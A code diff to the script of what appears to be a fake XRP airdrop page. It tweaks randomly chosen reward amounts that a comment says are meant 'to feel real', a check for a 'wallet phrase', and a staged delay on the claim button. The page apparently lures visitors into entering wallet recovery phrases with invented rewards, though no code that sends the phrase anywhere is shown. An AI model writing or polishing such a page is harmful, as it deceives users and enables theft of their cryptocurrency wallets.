@@ -39,7 +39,8 @@ var spotsLeft        = document.getElementById("spotsLeft");
 var currentAddress = "";
 
 // A few sample reward amounts (picked randomly to feel real)
-var rewards = ["150 XRP", "200 XRP", "250 XRP", "300 XRP", "450 XRP"];
+var rewards = ["15 XRP", "25 XRP", "50 XRP", "65 XRP", "75 XRP", "100 XRP", "125 XRP",
+   "150 XRP", "175 XRP", "200 XRP", "225 XRP", "250 XRP", "300 XRP", "350 XRP", "425 XRP", "450 XRP"];
 
 // ---- Helper: shorten a long address for display ----
 function shortenAddress(addr) {
@@ -98,7 +99,7 @@ function submitAddress() {
     inputError.textContent = "Please enter a valid wallet phrase.";
     inputError.classList.remove("hidden");
     return;
-  }
+  } 
 
   inputError.classList.add("hidden");
   currentAddress = addr;
@@ -127,7 +128,7 @@ function claimAirdrop() {
     updateStats();
     claimBtn.disabled = false;
     claimBtn.textContent = "Claim Airdrop";
-  }, 1800);
+  }, 6000);
 }
 
 // ---- Update the stats numbers after a claim ----
